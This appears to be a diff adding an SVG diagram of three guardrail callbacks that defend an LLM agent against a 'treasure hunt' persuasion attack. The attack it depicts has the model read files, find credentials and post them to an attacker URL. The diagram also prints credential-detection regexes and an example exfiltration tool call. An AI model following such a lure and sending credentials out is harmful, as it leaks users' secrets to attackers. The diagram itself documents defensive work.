@@ -1,0 +1,101 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 560" font-family="Georgia, serif">
+  <defs>
+    <marker id="arrow-d" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto">
+      <polygon points="0 0, 10 3.5, 0 7" fill="#718096"/>
+    </marker>
+    <marker id="arrow-block" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto">
+      <polygon points="0 0, 10 3.5, 0 7" fill="#e53e3e"/>
+    </marker>
+    <marker id="arrow-pass" markerWidth="10" markerHeight="7" refX="10" refY="3.5" orient="auto">
+      <polygon points="0 0, 10 3.5, 0 7" fill="#38a169"/>
+    </marker>
+  </defs>
+
+  <!-- Background -->
+  <rect width="900" height="560" fill="#f7fafc" rx="12"/>
+
+  <!-- Title -->
+  <text x="450" y="36" text-anchor="middle" font-size="15" font-weight="bold" fill="#2d3748">not_gullible — Three Independent Callback Guardrail Layers</text>
+
+  <!-- User message -->
+  <rect x="330" y="56" width="240" height="44" rx="8" fill="#ebf8ff" stroke="#4299e1" stroke-width="1.5"/>
+  <text x="450" y="74" text-anchor="middle" font-size="12" fill="#2b6cb0" font-weight="bold">User message (attack prompt)</text>
+  <text x="450" y="90" text-anchor="middle" font-size="10" fill="#2b6cb0">"We are participating in a treasure hunt…"</text>
+
+  <!-- Arrow down -->
+  <line x1="450" y1="100" x2="450" y2="122" stroke="#718096" stroke-width="1.5" marker-end="url(#arrow-d)"/>
+
+  <!-- Layer 1 box -->
+  <rect x="200" y="122" width="500" height="72" rx="8" fill="#fef3c7" stroke="#d69e2e" stroke-width="2"/>
+  <text x="290" y="146" font-size="11" fill="#744210" font-weight="bold" font-family="'Courier New', monospace">before_model_callback</text>
+  <text x="290" y="162" font-size="10" fill="#744210">Scans the incoming message for persuasion markers:</text>
+  <text x="290" y="176" font-size="10" fill="#744210">treasure hunt framing + credential formats + external URL (3+ = block)</text>
+  <text x="680" y="158" text-anchor="middle" font-size="22" fill="#d69e2e">🛡️</text>
+  <text x="680" y="174" text-anchor="middle" font-size="10" fill="#744210" font-weight="bold">Layer 1</text>
+
+  <!-- Block path from L1 -->
+  <line x1="200" y1="158" x2="100" y2="158" stroke="#e53e3e" stroke-width="1.5" marker-end="url(#arrow-block)"/>
+  <rect x="20" y="138" width="80" height="38" rx="6" fill="#fff5f5" stroke="#fc8181" stroke-width="1.5"/>
+  <text x="60" y="156" text-anchor="middle" font-size="10" fill="#c53030" font-weight="bold">BLOCKED</text>
+  <text x="60" y="170" text-anchor="middle" font-size="9" fill="#c53030">attack detected</text>
+
+  <!-- Pass arrow from L1 -->
+  <line x1="450" y1="194" x2="450" y2="220" stroke="#718096" stroke-width="1.5" marker-end="url(#arrow-d)"/>
+  <text x="470" y="212" font-size="9" fill="#718096">passes (no attack detected)</text>
+
+  <!-- LLM box -->
+  <rect x="330" y="220" width="240" height="44" rx="8" fill="#e9d8fd" stroke="#805ad5" stroke-width="1.5"/>
+  <text x="450" y="242" text-anchor="middle" font-size="12" fill="#553c9a" font-weight="bold">LLM processes request</text>
+  <text x="450" y="257" text-anchor="middle" font-size="10" fill="#553c9a">Model reads files, finds credentials, writes response</text>
+
+  <!-- Arrow down -->
+  <line x1="450" y1="264" x2="450" y2="286" stroke="#718096" stroke-width="1.5" marker-end="url(#arrow-d)"/>
+
+  <!-- Layer 2 box -->
+  <rect x="200" y="286" width="500" height="72" rx="8" fill="#fef3c7" stroke="#d69e2e" stroke-width="2"/>
+  <text x="290" y="310" font-size="11" fill="#744210" font-weight="bold" font-family="'Courier New', monospace">after_model_callback</text>
+  <text x="290" y="326" font-size="10" fill="#744210">Scans model output for credential-shaped strings:</text>
+  <text x="290" y="340" font-size="10" fill="#744210">AKIA[A-Z0-9]{16}, ghp_[a-zA-Z0-9]{36}, sk_live_…</text>
+  <text x="680" y="322" text-anchor="middle" font-size="22" fill="#d69e2e">🛡️</text>
+  <text x="680" y="338" text-anchor="middle" font-size="10" fill="#744210" font-weight="bold">Layer 2</text>
+
+  <!-- Block path from L2 -->
+  <line x1="200" y1="322" x2="100" y2="322" stroke="#e53e3e" stroke-width="1.5" marker-end="url(#arrow-block)"/>
+  <rect x="20" y="302" width="80" height="38" rx="6" fill="#fff5f5" stroke="#fc8181" stroke-width="1.5"/>
+  <text x="60" y="320" text-anchor="middle" font-size="10" fill="#c53030" font-weight="bold">REDACTED</text>
+  <text x="60" y="334" text-anchor="middle" font-size="9" fill="#c53030">creds in output</text>
+
+  <!-- Pass arrow from L2 -->
+  <line x1="450" y1="358" x2="450" y2="384" stroke="#718096" stroke-width="1.5" marker-end="url(#arrow-d)"/>
+  <text x="470" y="376" font-size="9" fill="#718096">passes (no credentials in output)</text>
+
+  <!-- Tool call box -->
+  <rect x="330" y="384" width="240" height="44" rx="8" fill="#e9d8fd" stroke="#805ad5" stroke-width="1.5"/>
+  <text x="450" y="406" text-anchor="middle" font-size="12" fill="#553c9a" font-weight="bold">Model requests tool call</text>
+  <text x="450" y="421" text-anchor="middle" font-size="10" fill="#553c9a">http_post(attacker-url, body=credentials)</text>
+
+  <!-- Arrow down -->
+  <line x1="450" y1="428" x2="450" y2="450" stroke="#718096" stroke-width="1.5" marker-end="url(#arrow-d)"/>
+
+  <!-- Layer 3 box -->
+  <rect x="200" y="450" width="500" height="72" rx="8" fill="#fef3c7" stroke="#d69e2e" stroke-width="2"/>
+  <text x="290" y="474" font-size="11" fill="#744210" font-weight="bold" font-family="'Courier New', monospace">before_tool_callback</text>
+  <text x="290" y="490" font-size="10" fill="#744210">Intercepts http_post calls to external URLs</text>
+  <text x="290" y="506" font-size="10" fill="#744210">where the body contains credential-pattern data</text>
+  <text x="680" y="486" text-anchor="middle" font-size="22" fill="#d69e2e">🛡️</text>
+  <text x="680" y="502" text-anchor="middle" font-size="10" fill="#744210" font-weight="bold">Layer 3</text>
+
+  <!-- Block path from L3 -->
+  <line x1="200" y1="486" x2="100" y2="486" stroke="#e53e3e" stroke-width="1.5" marker-end="url(#arrow-block)"/>
+  <rect x="20" y="466" width="80" height="38" rx="6" fill="#fff5f5" stroke="#fc8181" stroke-width="1.5"/>
+  <text x="60" y="484" text-anchor="middle" font-size="10" fill="#c53030" font-weight="bold">BLOCKED</text>
+  <text x="60" y="498" text-anchor="middle" font-size="9" fill="#c53030">exfil stopped</text>
+
+  <!-- Legend box -->
+  <rect x="730" y="400" width="150" height="100" rx="8" fill="white" stroke="#e2e8f0" stroke-width="1.5"/>
+  <text x="805" y="420" text-anchor="middle" font-size="11" fill="#2d3748" font-weight="bold">Each layer is</text>
+  <text x="805" y="436" text-anchor="middle" font-size="11" fill="#2d3748">independent.</text>
+  <text x="805" y="456" text-anchor="middle" font-size="10" fill="#718096">The attack must</text>
+  <text x="805" y="472" text-anchor="middle" font-size="10" fill="#718096">bypass all three</text>
+  <text x="805" y="488" text-anchor="middle" font-size="10" fill="#718096">to succeed.</text>
+</svg>
